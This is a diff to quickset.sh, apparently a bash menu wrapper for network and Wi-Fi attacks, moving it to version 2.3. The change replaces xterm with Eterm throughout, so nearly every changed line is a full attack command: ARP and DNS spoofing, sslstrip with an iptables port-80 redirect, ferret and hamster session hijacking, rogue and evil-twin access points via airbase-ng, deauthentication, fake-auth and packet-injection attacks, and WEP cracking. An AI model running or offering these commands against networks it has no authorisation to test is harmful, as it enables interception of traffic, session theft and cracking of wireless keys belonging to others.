@@ -3,7 +3,7 @@ function script_info()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: quickset.sh
-## Version: 2.1.1
+## Version: 2.3
 ## Copyright (C) <2009>  <Snafu>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -113,6 +113,8 @@ function script_info()
 ## After further study into the matter it seems that matching of MTUs is not to be recommended; The only MTU that needs to be changed is at0.  at0 should be set to 1400 for the MTU value.
 
 ##  On 2 Jan 2012, no_dev--() was implemented to speed up NIC naming, whereby if a user had neglected to name NICs during the initial setup; it would not slow them down later on.
+
+## On 7 January 2012, Eterm replaced xterm.  This is a much slicker program.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 
 
 
@@ -744,7 +746,7 @@ case $var in
 	3) ferret--;;
 
 	4) if [[ -f hamster.txt ]];then
-		xterm -bg black -fg grey -sb -rightbar -title "Hamster" -e hamster &
+		Eterm -b black -f white --pause --title "Hamster" -e hamster &
 	else
 		echo -e "\033[31m\n\nhamster.txt MUST exist to run hamster"
 		read
@@ -808,7 +810,9 @@ case $rte_choice in
 	fi;;
 
 	4) dev_parent="routing--"
-	no_dev-- monitor ;;
+	if [ -z $pii ];then
+		no_dev-- monitor
+	fi;;
 esac
 
 case $rte_choice in
@@ -950,14 +954,14 @@ arpspoof--()
 	{
 	if [[ $arp_way == "yes" ]];then
 		while [ "$1" != "" ];do
-			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
-			xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
+			Eterm -b black -f white --pause --title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
+			Eterm -b black -f white --pause --title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
 			shift
 		done
 
 	else
 		while [ "$1" != "" ];do
-			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
+			Eterm -b black -f white --pause --title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
 			shift 
 		done
 
@@ -1000,7 +1004,7 @@ S)ingle Tgt\033[1;34m
 	read var
 	case $var in
 		e|E) var_II="x"
-		xterm -bg black -fg grey -title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &
+		Eterm -b black -f white --pause --title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &
 		atk_menu--;;
 
 		m|M) var_II="x"
@@ -1036,12 +1040,12 @@ S)ingle Tgt\033[1;34m
 			read var
 			case $var in 
 				y|Y) var_III="x"
-				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
-				xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $tgt_ip" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
+				Eterm -b black -f white --pause --title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
+				Eterm -b black -f white --pause --title "ARP to $gt_way (GW) as $tgt_ip" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
 				atk_menu--;;
 
 				n|N) var_III="x"
-				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
+				Eterm -b black -f white --pause --title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
 				atk_menu--;;
 
 				*) var_III= ;; ## Nulled
@@ -1112,10 +1116,10 @@ M)ain Menu\033[1;34m
 			dnsspoof_II--
 		else
 			case $d_hosts in
-				Yes) xterm -bg black -fg grey -sb -rightbar -title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
+				Yes) Eterm -b black -f white --pause --title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
 				atk_menu--;;
 
-				No) xterm -bg black -fg grey -sb -rightbar -title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
+				No) Eterm -b black -f white --pause --title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
 				atk_menu--;;
 			esac
 
@@ -1211,10 +1215,10 @@ M)ain Menu\033[1;34m
 					esac
 				done
 
-				xterm -bg black -fg grey -sb -rightbar -title "Ferret" -e ferret -i $fer_dev --channel $fer_chan & 
+				Eterm -b black -f white --pause --title "Ferret" -e ferret -i $fer_dev --channel $fer_chan & 
 				atk_menu--;;
 
-				wired) xterm -bg black -fg grey -sb -rightbar -title "Ferret" -e ferret -i $fer_dev & 
+				wired) Eterm -b black -f white --pause --title "Ferret" -e ferret -i $fer_dev & 
 				atk_menu--;;
 			esac
 
@@ -1253,18 +1257,18 @@ ssl_tail="Yes" ## SSLStrip Tail Log
 	{
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $lst_port
 	if [[ $lck_fav == "Yes" && $ses_kil == "Yes" ]];then
-		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port & ssl_pid=$!
+		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -k -l $lst_port & ssl_pid=$!
 	elif [[ $lck_fav == "Yes" && $ses_kil == "No" ]];then
-		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port & ssl_pid=$!
+		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -f -l $lst_port & ssl_pid=$!
 	elif [[ $lck_fav == "No" && $ses_kil == "Yes" ]];then
-		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port & ssl_pid=$!
+		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -k -l $lst_port & ssl_pid=$!
 	else
-		xterm -bg black -fg grey -sb -rightbar -title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -l $lst_port & ssl_pid=$!
+		Eterm -b black -f white --pause --title "SSLStrip" -e sslstrip -w $sstrip_log $log_opt -l $lst_port & ssl_pid=$!
 	fi
 
 	sleep 5
 	case $ssl_tail in
-		Yes) xterm -bg black -fg grey -sb -rightbar -title "SSLStrip Tail $(pwd)/$sstrip_log" -e tail -f $sstrip_log & ;;
+		Yes) Eterm -b black -f white --pause --title "SSLStrip Tail $(pwd)/$sstrip_log" -e tail -f $sstrip_log & ;;
 	esac
 
 	atk_menu--
@@ -1611,7 +1615,7 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 		esac
 
 		case $dhcp_tail in
-			Yes) xterm -bg black -fg grey -sb -rightbar -title "DHCP Server Tail /var/lib/dhcp3/dhcpd.leases" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
+			Yes) Eterm -b black -f white --pause --title "DHCP Server Tail /var/lib/dhcp3/dhcpd.leases" -e tail -f /var/lib/dhcp3/dhcpd.leases & ;;
 		esac
 
 		echo -e "\033[1;33m\n\n\n\nDHCP server started succesfully\n\n"
@@ -1778,7 +1782,7 @@ pres_mac=$(echo $pres_mac | awk '{print $1}')
 #blackhole targets every single probe request on current channel
 modprobe tun
 if [ $BB == "1" ]; then
-	xterm -bg black -fg grey -sb -rightbar -title "Blackhole AP" -e airbase-ng -c $sac -P -C 60 $pii &
+	Eterm -b black -f white --pause --title "Blackhole AP" -e airbase-ng -c $sac -P -C 60 $pii &
 	clear
 ## bullzeye targets specified ESSID only
 elif [ $BB == "2" ]; then
@@ -1788,7 +1792,7 @@ elif [ $BB == "2" ]; then
 		read SSID
 	done
 
-	xterm -bg black -fg grey -sb -rightbar -title "Bullzeye AP" -e airbase-ng -c $sac -e "$SSID" $pii &
+	Eterm -b black -f white --pause --title "Bullzeye AP" -e airbase-ng -c $sac -e "$SSID" $pii &
 	clear
 elif [ $BB == "3" ];then
 	private= ## Nulled
@@ -1807,10 +1811,10 @@ elif [ $BB == "3" ];then
 	case $var in
 		y|Y) echo -e "\033[36m\nPassword? (a-f, 0-9) [10 Characters]"
 		read wep_pword
-		xterm -bg black -fg grey -sb -rightbar -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" -w $wep_pword $pii &
+		Eterm -b black -f white --pause --title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" -w $wep_pword $pii &
 		clear;;
 
-		n|N) xterm -bg black -fg grey -sb -rightbar -title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" $pii & ;;
+		n|N) Eterm -b black -f white --pause --title "Wifi Extender AP" -e airbase-ng -c $sac -e "$SSID" $pii & ;;
 
 		*) ap--;;
 	esac
@@ -1962,7 +1966,7 @@ trap trap_101-- INT
 ## Yes, the next couple lines are lazy, I will eventually create cfile_III--(), right now, I am just pushing to get this new version out.
 	case $parent_VI in
 		ctech) parent_VI= ## Nulled to prevent repeat looping that is NOT wanted!
-		xterm -bg black -fg grey -sb -rightbar -title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
+		Eterm -b black -f white --pause --title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
 		sleep 2;;
 	esac
 	}
@@ -1985,7 +1989,7 @@ trap trap_101-- INT
                   ...MAKE SURE...
 
   IF YOU ELECTED TO DO THE PRELIMINARY AIRODUMP-NG SCAN
-YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION
+YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG ETERM SESSION
 
 ..........UNDESIRED RESULTS MAY OCCUR OTHERWISE...........
 **********************************************************
@@ -2133,7 +2137,7 @@ M)ain Menu\033[1;34m
 		*) wifi_scan--;;
 	esac
 
-	xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
+	Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
 	venue--
 	}
 
@@ -2201,9 +2205,9 @@ M)ain Menu\033[1;34m
 	kill -9 $wifi_ias_pid
 	kill -9 $wifi_dea_pid
 	if [[ -z $b ]];then
-		xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel: $tc File: $cf Format: $of" -e airodump-ng $pii --channel $tc -w $cf --output-format $of &
+		Eterm -b black -f white --pause --title "AiroDump Channel: $tc File: $cf Format: $of" -e airodump-ng $pii --channel $tc -w $cf --output-format $of &
 	else
-		xterm -bg black -fg grey -sb -rightbar -title "AiroDump Channel: $tc File: $cf BSSID: $b Format: $of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format $of &
+		Eterm -b black -f white --pause --title "AiroDump Channel: $tc File: $cf BSSID: $b Format: $of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format $of &
 	fi
 
 	venue--
@@ -2235,7 +2239,7 @@ M)ain Menu\033[1;34m
 				read hop
 			done
 
-			xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
+			Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
 			sleep .7
 			wifi_deauth--
 			}
@@ -2315,7 +2319,7 @@ M)ain Menu\033[1;34m
 
 	kill -9 $wifi_ias_pid
 	kill -9 $wifi_dea_pid
-	xterm -bg black -fg grey -sb -rightbar -title "Channel Scan: $sc" -e airodump-ng $pii --channel $sc --bssid $rb & wifi_dea_pid=$!
+	Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng $pii --channel $sc --bssid $rb & wifi_dea_pid=$!
 	sleep .7
 	wifi_deauth_II--
 	clear
@@ -2406,13 +2410,13 @@ M)ain Menu\033[1;34m
 	esac
 
 	if [[ -z $hid_essid && -z $ska_xor ]];then
-		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm &
+		Eterm -b black -f white --pause --title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm &
 	elif [[ -z $ska_xor ]];then
-		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth Hidden ESSID" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" &
+		Eterm -b black -f white --pause --title "Fake Auth Hidden ESSID" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" &
 	elif [[ -z $hid_essid ]];then
-		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor &
+		Eterm -b black -f white --pause --title "Fake Auth w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor &
 	else
-		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth Hidden ESSID w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor -e "$hid_essid" &
+		Eterm -b black -f white --pause --title "Fake Auth Hidden ESSID w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor -e "$hid_essid" &
 	fi
 
 	venue--
@@ -2658,7 +2662,7 @@ M)ain Menu\033[1;34m
 	esac
 
 
-	xterm -bg black -fg grey -sb -rightbar -title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
+	Eterm -b black -f white --pause --title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
 	venue--
 	}
 
@@ -2723,7 +2727,7 @@ M)ain Menu\033[1;34m
 			sleep 1
 			crack--
 		else
-			xterm -bg black -fg grey -sb -rightbar -hold -title "WEP Crackin BSSID: $b File: $cf" -e aircrack-ng -a 1 -b $b $cf* &
+			Eterm -b black -f white --pause --title "WEP Crackin BSSID: $b File: $cf" -e aircrack-ng -a 1 -b $b $cf* &
 			crack--
 		fi;;
 
@@ -2963,9 +2967,9 @@ M)ain Menu\033[1;34m
 	frag_gen--()
 	{
 	if [[ -z $e ]];then
-		xterm -bg black -fg grey -sb -rightbar -hold -title "Fragmentation Attack BSSID: $b" -e aireplay-ng -5 -b $b -h $sm $pii &
+		Eterm -b black -f white --pause --title "Fragmentation Attack BSSID: $b" -e aireplay-ng -5 -b $b -h $sm $pii &
 	else
-		xterm -bg black -fg grey -sb -rightbar -hold -title "Fragmentation Attack ESSID: $e" -e aireplay-ng -5 -b $b -e "$e" -h $sm $pii &
+		Eterm -b black -f white --pause --title "Fragmentation Attack ESSID: $e" -e aireplay-ng -5 -b $b -e "$e" -h $sm $pii &
 	fi
 	}
 
@@ -2973,19 +2977,19 @@ M)ain Menu\033[1;34m
 	chop_gen--()
 	{
 	if [[ -z $e ]];then
-		xterm -bg black -fg grey -sb -rightbar -hold -title "ChopChop Attack BSSID: $b" -e aireplay-ng -4 -b $b -h $sm $pii &
+		Eterm -b black -f white --pause --title "ChopChop Attack BSSID: $b" -e aireplay-ng -4 -b $b -h $sm $pii &
 	else
-		xterm -bg black -fg grey -sb -rightbar -hold -title "ChopChop Attack ESSID: $e" -e aireplay-ng -4 -b $b -e "$e" -h $sm $pii &
+		Eterm -b black -f white --pause --title "ChopChop Attack ESSID: $e" -e aireplay-ng -4 -b $b -e "$e" -h $sm $pii &
 	fi
 	}
 
 ## ARP sub-function
 	arp_out--()
-	{ xterm -bg black -fg grey -sb -rightbar -title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm & }
+	{ Eterm -b black -f white --pause --title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm & }
 
 ## Broadcast Attack sub-function
 	broad_out--()
-	{ xterm -bg black -fg grey -sb -rightbar -title "Broadcast Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }
+	{ Eterm -b black -f white --pause --title "Broadcast Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }
 
 ##~~~~~~~~~~~~~~~~ END wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -3041,13 +3045,13 @@ M)ain Menu\033[1;34m
 	st_1--
 	clear
 	case $ct in
-		1) xterm -bg black -fg grey -sb -rightbar -title "Hirte (AP)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 &
+		1) Eterm -b black -f white --pause --title "Hirte (AP)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 &
 		sleep 2;;
 
-		2) xterm -bg black -fg grey -sb -rightbar -title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
+		2) Eterm -b black -f white --pause --title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
 		sleep 2;;
 
-		3) xterm -bg black -fg grey -sb -rightbar -title "Cafe-Latte" -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
+		3) Eterm -b black -f white --pause --title "Cafe-Latte" -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
 		sleep 2;;
 
 		4) parent_VI="ctech"
@@ -3065,14 +3069,14 @@ M)ain Menu\033[1;34m
 	case $spec in
 		1) case $wifu in
 			1|2|3) wpa_warn--
-			xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -F ab_$cf & wpa_pid=$! ;;
+			Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -F ab_$cf & wpa_pid=$! ;;
 
 			7|8|9) wpa_warn--
-			xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -y -F ab_$cf & wpa_pid=$! ;;
+			Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -y -F ab_$cf & wpa_pid=$! ;;
 		esac;;
 
 		2) wpa_warn--
-		xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
+		Eterm -b black -f white --pause --title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
 	esac
 
 	WPA--
@@ -3101,8 +3105,8 @@ if [ -z $1  ]; then
 	pii= ## Dual mode variable, can be monitormode variable, or device to be assigned to monitor mode
 	kill_mon= ## Variable to determine if the "killing a monitor mode option" has been selected
 	dev_check= ## Nulled
-	current_ver=2.1.1
-	rel_date="03 January 2012"
+	current_ver=2.3
+	rel_date="07 January 2012"
 	trap_check= ## Variable for exiting out of the Parent script if the update feature is launched
 	greet--
 else
